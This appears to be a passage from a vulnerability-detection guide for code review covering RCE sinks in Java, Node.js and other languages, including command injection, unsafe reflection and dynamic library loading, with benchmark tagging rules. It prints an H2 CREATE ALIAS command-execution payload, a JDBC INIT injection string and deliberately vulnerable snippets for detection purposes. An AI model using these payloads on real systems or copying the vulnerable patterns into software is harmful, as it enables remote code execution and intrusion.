// H2's CREATE ALIAS allows defining Java methods:
// CREATE ALIAS EXEC AS $$ void exec(String s) throws Exception { Runtime.getRuntime().exec(s); } $$
// CALL EXEC('id')

// VULN indicator: application executes user-controlled SQL against H2 database
Statement stmt = h2Connection.createStatement();
stmt.execute(request.getParameter("sql"));   // DDL allowed → CREATE ALIAS → RCE

// VULN indicator: H2 INIT parameter in JDBC URL
String jdbcUrl = "jdbc:h2:mem:test;" + request.getParameter("options");
// options=INIT=CREATE ALIAS EXEC AS $$ ... $$\;CALL EXEC('id')
Connection conn = DriverManager.getConnection(jdbcUrl);
```

## Java Additional RCE Sinks Checklist

Flag any of these when user-controlled data flows into them:

| Sink | Tag | Condition |
|------|-----|-----------|
| `Runtime.getRuntime().exec(tainted)` | rce | tainted = user input or concatenated user input |
| `new ProcessBuilder(tainted).start()` | rce | any arg tainted |
| `new ProcessBuilder("sh", "-c", tainted).start()` | rce | always VULN |
| `SpelExpressionParser().parseExpression(tainted)` | rce | StandardEvaluationContext |
| `Ognl.getValue(tainted, ...)` | rce | tainted = user input |
| `MVEL.eval(tainted, ...)` | rce | tainted = user input |
| `new GroovyShell().evaluate(tainted)` | rce | always VULN |
| `ScriptEngine.eval(tainted)` | rce | always VULN |
| `ObjectInputStream.readObject()` on user stream | insecure_deserialization | — |
| `new InitialContext().lookup(tainted)` | rce + ssrf | JNDI injection |
| H2 `stmt.execute(tainted)` with DDL allowed | rce | CREATE ALIAS path |
| Log4j2 < 2.15.0 logging user strings | rce | Log4Shell |

**Benchmark tag override**: In benchmark mode, prefer more specific tags per SKILL.md guardrails: `command_injection` for direct shell/process execution sinks, `spel_injection` for SpEL expression evaluation, `jndi_injection` for JNDI lookup sinks. Use `rce` only when no more specific benchmark tag applies.

## Node.js RCE Sink Checklist

| Sink | Condition | Verdict |
|------|-----------|---------|
| `exec(userInput)` | any user input | VULN |
| `execSync(userInput)` | any user input | VULN |
| `eval(userInput)` | any user input | VULN |
| `new Function(userInput)()` | any user input | VULN |
| `vm.runInThisContext(userInput)` | any user input | VULN |
| `spawn(cmd, [args])` | cmd hardcoded, args = user input | SAFE (no shell) |
| `spawn(cmd, args, {shell:true})` | any user arg | VULN |
| `child_process.fork(userInput)` | user-controlled module path | VULN (arbitrary module load) |

- Direct `Runtime.getRuntime().exec(...)`, `ProcessBuilder`, shell wrappers, or SSI/CGI-to-command chains should use benchmark tag `command_injection`, not generic `rce`, when the first dangerous sink is OS command execution.
- In `SecExample`, `rcecontroller` is project-level `command_injection`.
- In `vulhub`, `httpd/ssi-rce` and similar upload/SSI execution samples should preserve `command_injection` at project-tag layer.
- FALSE POSITIVE guard: keep `rce` only when no more specific benchmark tag exists.
- In `SecExample`, `/rceoutput` with `Runtime.getRuntime().exec(command)` must preserve benchmark tag `command_injection`; do not emit an extra standalone `rce` tag for that same source→sink path.

## Unsafe Reflection Detection (CWE-470)

When user-controlled input reaches `Class.forName()` or similar reflection APIs, an attacker can instantiate arbitrary classes, invoke methods, or access fields — leading to RCE, privilege escalation, or sandbox escape.

### Vulnerable Patterns

```java
// VULNERABLE: user input controls the class name
String className = request.getParameter("class");
Class<?> clazz = Class.forName(className);
Object obj = clazz.getDeclaredConstructor().newInstance();

// VULNERABLE: reflection chain with user-controlled method name
String methodName = request.getParameter("method");
Method m = clazz.getMethod(methodName);
m.invoke(obj);

// VULNERABLE: ServiceLoader or plugin loader with user-controlled class path
URLClassLoader loader = new URLClassLoader(new URL[]{new URL(userInput)});
Class<?> plugin = loader.loadClass(request.getParameter("plugin"));
```

### Safe Patterns

```java
// SAFE: allowlist of permitted class names
Map<String, Class<?>> allowed = Map.of("csv", CsvExporter.class, "json", JsonExporter.class);
Class<?> clazz = allowed.get(request.getParameter("format"));
if (clazz == null) throw new IllegalArgumentException("Unknown format");
```

### Cross-language reflection sinks

Reflection RCE is not Java-only. Flag a user-controlled string reaching any of these dynamic class/method resolvers:

| Language | Sinks (user-controlled class or method name) |
|----------|----------------------------------------------|
| Java/Kotlin | `Class.forName(x)`, `ClassLoader.loadClass(x)`, `Method.invoke`, `getDeclaredConstructor().newInstance()` |
| Ruby | `x.constantize` / `x.safe_constantize` / `x.classify.constantize`, `obj.send(x, ...)` / `public_send(x, ...)`, `Object.const_get(x)`, `x.to_sym` → dispatch (Rails dynamic render/`render template: x`) |
| Python | `getattr(obj, x)(...)`, `__import__(x)` / `importlib.import_module(x)`, `globals()[x]` / `eval`/`exec` resolving a callable |
| PHP | variable function `$x()`, variable method `$obj->$x()`, `call_user_func($x)` / `call_user_func_array`, `new $x(...)` (dynamic class instantiation) |
| .NET | `Type.GetType(x)`, `Activator.CreateInstance(...)`, `Assembly.Load*(x)`, `MethodInfo.Invoke` on a user-named member |
| Go | `plugin.Open(x).Lookup(y)`; `reflect.Value.MethodByName(x).Call(...)` |

Tag `unsafe_reflection`/`rce` when the resolved class/method name is attacker-influenced and reaches instantiation or invocation without an allow-list. Ruby `constantize`/`send` and PHP `new $x`/`$obj->$x()` are frequent real-world sinks that lack any built-in allow-listing.

### Detection Rules

- `Class.forName(userInput)` where `userInput` is derived from HTTP request data → **CONFIRM** (CWE-470)
- `ClassLoader.loadClass(userInput)` with user-controlled class name → **CONFIRM**
- Reflection combined with `newInstance()` or `Method.invoke()` on user-controlled targets → **CONFIRM**
- Ruby `params[...].constantize` / `obj.send(params[...])`, PHP `new $userClass` / `$obj->$userMethod()`, Python `getattr(obj, user)(...)` → **CONFIRM**

### Tag Selection

- When the reflection sink leads to arbitrary class instantiation or method invocation: tag as `rce`
- When the reflection is limited to loading a class without instantiation and no further exploitation is evident: tag as `unsafe_reflection` if supported, otherwise `rce`
- In benchmark mode, prefer the tag that matches the ground truth taxonomy of the project

## Dynamic Library / Assembly / Module Load From Untrusted Path (CWE-114 / CWE-470)

Distinct from `Class.forName` reflection: when user-controlled input chooses the **file path** of a native library, managed assembly, or runtime module to load, the loader maps and executes attacker-chosen code (initializers / DllMain / module top-level code run on load). This is RCE even without explicit instantiation. It also overlaps with path traversal (the path is the sink) and library search-order hijack (see `environment_variable_injection.md` for `LD_PRELOAD`/`PATH`-driven variants).

**Sinks — load code from a path/name (flag when the path/name is tainted):**
- **C/C++**: `dlopen`, `LoadLibrary`/`LoadLibraryEx`, `LoadPackagedLibrary` (also `CreateProcess` with an unquoted/relative path → search-order hijack, CWE-428)
- **Java/JVM**: `System.load(path)`, `System.loadLibrary(name)`, `Runtime.load`/`loadLibrary`, `URLClassLoader(new URL[]{userUrl})`, `ServiceLoader` over a tainted classpath
- **C# / .NET**: `Assembly.LoadFrom`/`LoadFile`/`Load(byte[])`, `Assembly.UnsafeLoadFrom`, `AppDomain.Load`, `NativeLibrary.Load`, `Activator.CreateInstanceFrom` (CWE-114 assembly-path injection)
- **Python**: `ctypes.CDLL/WinDLL/cdll.LoadLibrary(path)`, `importlib.import_module(userName)` / `__import__`, `imp.load_source/load_dynamic`
- **Node.js**: `require(userPath)`, dynamic `import(userPath)`, `process.dlopen(module, userPath)`
- **Go**: `plugin.Open(userPath)`
- **PHP**: `dl(userExtension)`
- **Ruby**: `require`/`load`/`require_relative` with a user-controlled path

**VULN (C#):** `Assembly.LoadFrom(Request.QueryString["plugin"]).CreateInstance(typeName);`
**VULN (Python):** `ctypes.CDLL(request.args["lib"])`
**SAFE:** resolve against a fixed plugin directory, canonicalize, verify the resolved path stays inside it, and load only from an allowlist of known module names — never a request-derived absolute/relative path. For native libraries, prefer a fixed, signed, absolute path.

**Detection:** any loader sink above whose path/name argument is taint-reachable from request data → **CONFIRM** (`rce`). Loading from a fixed literal or an allowlisted name is **SAFE**.

## Source -> Sink Pattern

**Sources**
- `ActiveThreatModelSource` — HTTP request data (all languages)
- JavaScript command injection: `ClientRequest.getAResponseDataNode()` (server response as second-order source)

**Sinks — Command Injection (CWE-078)**
- **Java**: tainted arg to `Runtime.exec`/`ProcessBuilder` when script interpreter invoked; also library wrappers — Apache Commons Exec (`org.apache.commons.exec` `CommandLine.parse(userInput)` / `DefaultExecutor.execute`) and Apache Ant (`org.apache.tools.ant.taskdefs.Execute`, `ExecTask`)
- **JavaScript**: `SystemCommandExecution.getACommandArgument()` — `child_process.exec`, `execSync`, `spawn` with shell; indirect/second-order command injection; shell command injection from environment
- **Python**: `SystemCommandExecution.getCommand()` — `os.system`, `os.popen`, `subprocess.Popen/run/call` (excludes internal stdlib wrapper noise)
- **Go**: `SystemCommandExecution.getCommandName()` — `exec.Command`, `exec.CommandContext`
- **C#**: `System.Diagnostics.Process.Start` args; `ProcessStartInfo` constructor and `Arguments`/`FileName`/`WorkingDirectory` setters
- **Ruby**: shell/backtick/`Open3`/`IO.popen` execution sinks

**Sinks — Code Injection / Eval (CWE-094)**
- **Java**: `ExpressionParser.parseExpression/parseRaw` (SpEL); Groovy, MVEL, JEXL, OGNL injection sinks (CWE-917 for OGNL)
- **JavaScript**: `eval`, `Function`, `setTimeout/setInterval(string)`, `vm` module, `node-serialize.unserialize`; template engines (`pug`, `ejs`, `handlebars`, `lodash.template`, etc. via unsafe code construction); AngularJS expressions; MongoDB `$where` code operators
- **Python**: `eval`, `exec`, `compile` + execution sinks via `CodeExecution.getCode()`

**Sanitizers / barriers**
- JavaScript: `JSON.stringify` (code injection); model `command-injection`/`code-injection` barriers; `shell-quote` parsing (recommended manual barrier, not automatic)
- Python/JS: `ConstCompareBarrier` (allowlist guards)
- Go command injection: `RegexpCheckBarrier`; prefix check that string does not start with `--` (flag injection mitigation)
- C#/Java: `SimpleTypeSanitizedExpr`, `GuidSanitizedExpr`
- Java SpEL: `SimpleEvaluationContext` (not flagged — full `StandardEvaluationContext` is vulnerable)

Commonly affected languages: JavaScript, Python, Go, C#, Ruby, Java.

**Safe patterns**: `child_process.execFile`/`spawn` with array args (no shell); `subprocess.run([...], shell=False)`; hardcoded command allowlists; Go `exec.Command("binary", arg)` without `sh -c`.

### Static analysis false alarms

- `spawn('ping', [host])` with hardcoded binary — treated as safe (no shell)
- `ProcessBuilder` with fixed command array and taint only in non-argument env var (context-dependent)
- Go commands where input is validated by regexp barrier before reaching sink
- Template engines where user data is passed as interpolation options, not embedded in template source string
- Java `Runtime.exec` with fully static string array — no remote source reaches args
